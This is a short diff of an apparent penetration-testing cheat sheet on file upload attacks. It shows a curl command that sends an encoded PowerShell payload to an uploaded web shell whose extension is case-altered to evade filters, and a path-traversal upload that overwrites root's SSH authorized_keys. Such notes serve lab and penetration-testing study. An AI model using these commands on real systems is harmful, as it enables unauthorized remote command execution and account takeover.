@@ -57,7 +57,7 @@ $EncodedText =[Convert]::ToBase64String($Bytes)
 curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20+$EncodedText
 ```
 
-### Upload non-executable file
+### If can't execute uploaded file, try overwriting file
 ```
 upload ../../../../../../../root/.ssh/authorized_keys
 rm ~/.ssh/known_hosts
